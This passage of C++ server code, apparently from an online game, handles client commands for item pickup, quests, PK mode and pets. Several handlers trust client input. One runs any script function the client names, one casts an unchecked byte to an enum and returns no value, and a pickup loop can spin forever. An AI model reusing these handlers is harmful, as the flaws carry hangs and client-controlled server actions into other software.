	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_pickitem_id)
{
	GET_PARAMS();
	long nID;
	long nRM;
	long nItemID;
	if (!cmd->ReadLong(&nID))
	{
		return CMD_ERROR_READ_DATA;
	}
	cmd->SerializeBit(nRM, 1);

	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(nID);
	if(NULL == pCre)
	{
		g_sendCmd->BeginWrite();
		g_sendCmd->WriteShort(r2c_pickitem_id);
		g_sendCmd->SerializeBit(nRM, 1);
		g_sendCmd->WriteByte(2);//物品已经消失
		g_sendCmd->WriteLong(nID);
		CmdGiver->RecvCmd(g_sendCmd);
	}
	else
	{
		if(0 == nRM)
		{
			if (!cmd->ReadLong(&nItemID))
			{
				return CMD_ERROR_READ_DATA;
			}
			int nRet = pCre->GetPlayerLogic()->GetMonsterLogicExt()->PickMyItem(CmdGiver, nItemID);
			if(4 == nRet)
			{
				g_sendCmd->BeginWrite();
				g_sendCmd->WriteShort(r2c_pickitem_id);
				g_sendCmd->SerializeBit(nRM, 1);
				g_sendCmd->WriteByte(1);
				g_sendCmd->WriteLong(nItemID);
				CmdGiver->RecvCmd(g_sendCmd);
			}
			else
			{
				g_sendCmd->BeginWrite();
				g_sendCmd->WriteShort(r2c_pickitem_id);
				g_sendCmd->SerializeBit(nRM, 1);
				g_sendCmd->WriteByte(0);
				g_sendCmd->WriteLong(nItemID);
				CmdGiver->RecvCmd(g_sendCmd);
			}
		}
		else
		{
			int nRes = pCre->GetPlayerLogic()->GetMonsterLogicExt()->PickAllMyItem(CmdGiver);
			g_sendCmd->BeginWrite();
			g_sendCmd->WriteShort(r2c_pickitem_id);
			g_sendCmd->SerializeBit(nRM, 1);
			g_sendCmd->WriteByte(nRes);
			CmdGiver->RecvCmd(g_sendCmd);
		}
	}
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_close_pickwindow)
{
	GET_PARAMS();
	long nID;
	long nRM;
	long nItemID;
	if (!cmd->ReadLong(&nID))
	{
		return CMD_ERROR_READ_DATA;
	}
	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(nID);
	if(NULL != pCre)
	{
		pCre->GetPlayerLogic()->GetMonsterLogicExt()->OnClosePickwindow(CmdGiver);
	}
	//CmdGiver->GetPlayerLogic()->DonotGetLifeItem();
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_stop_getskin)
{
	GET_PARAMS();
	CmdGiver->GetPlayerLogic()->StopGetLifeItem();
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_upload_taskid)
{
	GET_PARAMS();
	long nNPCID;
	long nTaskID;
	if (!cmd->ReadLong(&nNPCID))
	{
		return CMD_ERROR_READ_DATA;
	}
	if (!cmd->ReadLong(&nTaskID))
	{
		return CMD_ERROR_READ_DATA;
	}
	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(nNPCID);
	CRegionNpcTask *pNPC = (CRegionNpcTask*)(pCre);
	//ERR1("cmd_c2r_upload_taskid %s   %s\n", CmdGiver->m_core.Name.c_str(), pNPC->m_core.Name.c_str());
	if(NULL != pNPC)
	{
		pNPC->GetCNpcTaskLogicExt()->AcceptTaskByID(CmdGiver, (short)(nTaskID));
	}
	//CmdGiver->GetPlayerLogic()->DonotGetLifeItem();
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_upload_finish_taskid)
{
	GET_PARAMS();
	long nNPCID;
	long nTaskID;
	long nIndex;
	if (!cmd->ReadLong(&nNPCID))
	{
		return CMD_ERROR_READ_DATA;
	}
	if (!cmd->ReadLong(&nTaskID))
	{
		return CMD_ERROR_READ_DATA;
	}
	if (!cmd->ReadLong(&nIndex))
	{
		nIndex = 0;
	}
	CRegionCreature *pCre = CmdGiver->m_scene->FindCreature(nNPCID);
	CRegionNpcTask *pNPC = (CRegionNpcTask*)(pCre);
	//ERR1("cmd_c2r_upload_taskid %s   %s\n", CmdGiver->m_core.Name.c_str(), pNPC->m_core.Name.c_str());
	if(NULL != pNPC)
	{
		pNPC->GetCNpcTaskLogicExt()->FinishTaskByID(CmdGiver, (short)(nTaskID), nIndex);
	}
	//CmdGiver->GetPlayerLogic()->DonotGetLifeItem();
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_task_track)
{
	GET_PARAMS();
	
	long nTaskID;
	
	if (!cmd->ReadLong(&nTaskID))
	{
		return CMD_ERROR_READ_DATA;
	}
	CmdGiver->GetPlayerLogic()->TrackTask(nTaskID);
		return CMD_ERROR_NONE;
}
CMD_FUNCTION(cmd_c2r_task_canecl_track)
{
	GET_PARAMS();

	long nTaskID;

	if (!cmd->ReadLong(&nTaskID))
	{
		return CMD_ERROR_READ_DATA;
	}
	CmdGiver->GetPlayerLogic()->CaneclTrackTask(nTaskID);
	return CMD_ERROR_NONE; 
}

CMD_FUNCTION(cmd_c2r_pk_pick_item)
{
	GET_PARAMS();

	if (CmdGiver->m_vPkGetItemList.size() == 0)
		return CMD_ERROR_NONE;

	long lPickAll = 0;
	long lItemId = 0;

	cmd->SerializeBit(lPickAll,1);

	std::vector<SItemID>::iterator it = CmdGiver->m_vPkGetItemList.begin();
	CBag *pBag = &(CmdGiver->m_pItemContainer->m_Bag);
	int page, i, j;

	if (lPickAll)
	{
		for (;it!=CmdGiver->m_vPkGetItemList.end();)
		{
			if (ItemIsPet(*it)) continue;
			if(pBag->AddItem((*it), &page, &i, &j))
			{
				CItemCmdBuilder_Svr::Build_r2c_bag_additem((*it), ITEM_CONTAINER_PLAYER_COMMON_BAG, page, i, j, ITEM_REASON_PICK);
				CmdGiver->RecvCmd(g_sendCmd);
			}
			it = CmdGiver->m_vPkGetItemList.erase(it);
		}
	}
	else
	{
		if (cmd->ReadLong(&lItemId))
		{
			for (;it!=CmdGiver->m_vPkGetItemList.end();)
			{
				if ((*it).id == lItemId)
				{
					if (ItemIsPet(*it)) continue;
					if(pBag->AddItem((*it), &page, &i, &j))
					{
						CItemCmdBuilder_Svr::Build_r2c_bag_additem((*it), ITEM_CONTAINER_PLAYER_COMMON_BAG, page, i, j, ITEM_REASON_PICK);
						CmdGiver->RecvCmd(g_sendCmd);
					}
					it = CmdGiver->m_vPkGetItemList.erase(it);
					break;
				}
				else
				{
					++it;
				}
			}
		}
	}
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_Guide)
{
	GET_PARAMS();

	short nID;

	if (!cmd->ReadShort(&nID))
	{
		return CMD_ERROR_READ_DATA;
	}
	if (0 <= nID && nID < eGuideTypeNum)
	{
		CmdGiver->GetPlayerLogic()->DoGuide((GuideType)nID);
	}
	
	return CMD_ERROR_NONE;
}


CMD_FUNCTION(cmd_c2r_change_pkmode)
{
	GET_PARAMS();
	char mode;
	if (!cmd->ReadByte(&mode))
	{
		return CMD_ERROR_READ_DATA;
	}
	if ( !CmdGiver->IsInCombat() )
	{
		CmdGiver->m_ePkMode = (EPkMode)mode;
	}
}

CMD_FUNCTION(cmd_c2r_SynOnlineTime)
{
	GET_PARAMS();
	CmdGiver->GetPlayerLogic()->ClientGetOnLineTime();
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_ctrl_pet)
{
	GET_PARAMS();
	char ctrlType = 0;
	long param = 0;
	long param2 = 0;

	CBag *pBag = &CmdGiver->m_pItemContainer->m_PetBag;

	SAFE_READ(cmd->ReadByte(&ctrlType));

	if (ctrlType == PET_CTRL_CALLBACK)
	{
		if (!CmdGiver->m_pet)
			return CMD_ERROR_NONE;

		DWORD petID = CmdGiver->m_pet->GetObjectId();

		if (CmdGiver->CallbackPet(false))
		{
			g_sendCmd->BeginWrite();
			g_sendCmd->WriteShort(r2c_ctrl_pet);
			g_sendCmd->WriteByte(PET_CTRL_CALLBACK);
			g_sendCmd->WriteLong(petID);
			if (CmdGiver->m_scene)
				CmdGiver->m_scene->BroadcastCmd(CmdGiver->m_pos,DEFAULT_RANGE-100,g_sendCmd,NULL);
		}
		return CMD_ERROR_NONE;
	}
	else if (ctrlType == PET_CTRL_CALLOUT)
	{
		SAFE_READ(cmd->ReadLong(&param));
		SItemID petItem = pBag->GetItemFromID(param);
		if (ItemIsPet(petItem))
		{
			if (CmdGiver->ReleasePet(petItem))
			{
				if (!CmdGiver->m_pet)
					return CMD_ERROR_NONE;

				DWORD petID = CmdGiver->m_pet->GetObjectId();

				g_sendCmd->BeginWrite();
				g_sendCmd->WriteShort(r2c_ctrl_pet);
				g_sendCmd->WriteByte(PET_CTRL_CALLOUT);
				g_sendCmd->WriteLong(petID);
				if (CmdGiver->m_scene)
					CmdGiver->m_scene->BroadcastCmd(CmdGiver->m_pos,DEFAULT_RANGE-100,g_sendCmd,NULL);
			}
		}
		return CMD_ERROR_NONE;
	}
	else if (ctrlType == PET_CTRL_CHANGE_NAME)
	{
		char *name = NULL;
		SAFE_READ(cmd->ReadLong(&param));
		SAFE_READ(cmd->ReadString(&name));

		// 宠物名字检查未做

		if (strlen(name) > PET_NAME_CHAR_NUM_MAX || strlen(name) < PET_NAME_CHAR_NUM_MIN)
		{
			return CMD_ERROR_NONE;
		}

		int i = 0,j = 0,page = 0;

		if (pBag->Find(param,&page,&i,&j))
		{
			SItemID petItem = pBag->GetItemFromID(param);
			petItem.name = name;
			if (pBag->SetItem(page,i,j,petItem))
			{
				CmdGiver->m_pItemContainer->UpdateItemToClient(ITEM_CONTAINER_PLAYER_PET_BAG, page, i, j);
			}
		}
		if (CmdGiver->m_pet && CmdGiver->m_pet->m_ai)
		{
			CRegionPetAI *petAI = (CRegionPetAI*)CmdGiver->m_pet->m_ai;
			if (petAI->m_pItemPet.id == param)
			{
				CmdGiver->m_pet->m_core.Name = name;
				CmdGiver->SendPetInfo();
			}
		}
		return CMD_ERROR_NONE;
	}
	else if (ctrlType == PET_CTRL_USE_SKILL)
	{
		SAFE_READ(cmd->ReadLong(&param));
		SAFE_READ(cmd->ReadLong(&param2));
	}
	else if (ctrlType == PET_CTRL_SET_DEFSKILL)
	{
		SAFE_READ(cmd->ReadLong(&param));
	}
	else if (ctrlType == PET_CTRL_DELETE_PET)
	{
		SAFE_READ(cmd->ReadLong(&param));
		SItemID petItem = pBag->GetItemFromID(param);

		if (CmdGiver->m_pet && CmdGiver->m_pet->m_ai)
		{
			CRegionPetAI *petAI = (CRegionPetAI*)CmdGiver->m_pet->m_ai;
			if (petAI->m_pItemPet.id == param)
			{
				CmdGiver->CallbackPet(true);
			}
		}

		int i,j,page;
		if (!pBag->Find(petItem,&page,&i,&j))
			return CMD_ERROR_NONE;
		if (!pBag->RemoveItem(page, i, j))
			return CMD_ERROR_NONE;

		CItemCmdBuilder_Svr::Build_r2c_bag_removeitem(ITEM_CONTAINER_PLAYER_PET_BAG, page, i, j, ITEM_REASON_THROW);
		CmdGiver->RecvCmd(g_sendCmd);
		return CMD_ERROR_NONE;
	}
	else if (ctrlType == PET_CTRL_ATTACK)
	{
		SAFE_READ(cmd->ReadLong(&param));
	}

	if (!CmdGiver->m_pet || !CmdGiver->m_pet->m_ai)
		return CMD_ERROR_NONE;

	CRegionPetAI *petAI = (CRegionPetAI*)CmdGiver->m_pet->m_ai;
	petAI->UserCtrlPet(ctrlType,param,param2);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_fuse_pet)
{
	GET_PARAMS();
	char fuseType = 0;
	long start = 0;
	SItemID item[3];

	CBag *pBag = &CmdGiver->m_pItemContainer->m_Bag;
	if (!pBag) return false;

	CBag *pPetBag = &CmdGiver->m_pItemContainer->m_PetBag;
	if (!pPetBag) return false;

	SAFE_READ(cmd->ReadByte(&fuseType));
	cmd->SerializeBit(start,1);

	if (start == 0)
	{
		CCreatureState *state = CmdGiver->FindStateByType(CRE_STATE_FUSE_PET);
		if(state) 
		{
			state->End();
		}
		return CMD_ERROR_NONE;
	}

	for (int i=0;i<3;i++)
	{
		long id = 0;
		SAFE_READ(cmd->ReadLong(&id));
		if (id)
		{
			if (i == 0 || (fuseType == PET_FUSE_TYPE_MERGE && i == 1))
			{
				item[i] = pPetBag->GetItemFromID(id);
			}
			else
			{
				item[i] = pBag->GetItemFromID(id);
			}
		}
	}

	CRegionPetAI *petAI = NULL;
	if (CmdGiver->m_pet && CmdGiver->m_pet->m_ai)
	{
		petAI = (CRegionPetAI *)CmdGiver->m_pet->m_ai;
		if (petAI->m_pItemPet.id == item[0].id)
		{
			return CMD_ERROR_NONE;
		}
	}

	if ( !CanFusePet(g_region->m_pItemManager,fuseType,item[0],item[1],item[2]) )
		return CMD_ERROR_NONE;

	switch(fuseType)
	{
	case PET_FUSE_TYPE_MERGE:
		{
			if (petAI && petAI->m_pItemPet.id == item[1].id)
				return CMD_ERROR_NONE;
		}
		break;
	case PET_FUSE_TYPE_ABILITY:
		break;
	case PET_FUSE_TYPE_TOBEADS:
		break;
	case PET_FUSE_TYPE_MERGEBEADS:
		break;
	default:
		return CMD_ERROR_NONE;
	}

	CCreatureState *state = CmdGiver->FindStateByType(CRE_STATE_FUSE_PET);
	if(state) 
	{
		state->End();
		return CMD_ERROR_NONE;
	}

	state = RT_NEW CCreState_FusePet;
	SCreStateParam param;
	param.p1 = fuseType;
	if(!CmdGiver->AddState(state,&param))
	{
		DEL_ONE(state);
		return CMD_ERROR_NONE;
	}
	else
	{
		long start = 1;
		((CCreState_FusePet*)state)->SetFuseItem(fuseType,item);
	}

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_catch_pet)
{
	GET_PARAMS();
	if (!CmdGiver->m_scene) return CMD_ERROR_NONE;
	long start = 0;
	long petID;
	cmd->SerializeBit(start,1);

	if (start)
	{
		SAFE_READ(cmd->ReadLong(&petID));

		CRegionCreature *cre = CmdGiver->m_scene->FindCreature(petID);

		if(!cre || !cre->IsSpirit())
			return CMD_ERROR_NONE;

		if (cre->m_dwCatchMe)
		{
			CmdGiver->StopCatchSpirit(PET_CATCH_ERROR_BECATCHED);
			return CMD_ERROR_NONE;
		}

		SPet *pPet = g_TablePet.FindPet(cre->m_npcId);
		if(!pPet) return CMD_ERROR_NONE;

		if (CmdGiver->m_core.GradeLev < pPet->NeedCulLev)
		{
			CmdGiver->StopCatchSpirit(PET_CATCH_ERROR_CULLEV);
			return CMD_ERROR_NONE;
		}
		if(cre->Distance(CmdGiver->m_pos) > 120)
		{
			return CMD_ERROR_NONE;
		}
		if(CmdGiver->m_pItemContainer->m_PetBag.IsFull())
		{
			return CMD_ERROR_NONE;
		}
		if (!CmdGiver->m_Skill.FindActiveSkill(CATCH_PET_SKILL))
		{
			return CMD_ERROR_NONE;
		}
		CmdGiver->AddCatchSpiritState(cre);
	}
	else
	{
		CmdGiver->StopCatchSpirit(PET_CATCH_ERROR_CANCEL);
	}
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_execute_script)
{
	GET_PARAMS();

	char *sScriptFunc = 0;
	SAFE_READ(cmd->ReadString(&sScriptFunc));
	if(CmdGiver->IsScriptLoaded())
		CmdGiver->CallScript(sScriptFunc, false);
	return CMD_ERROR_NONE;
}
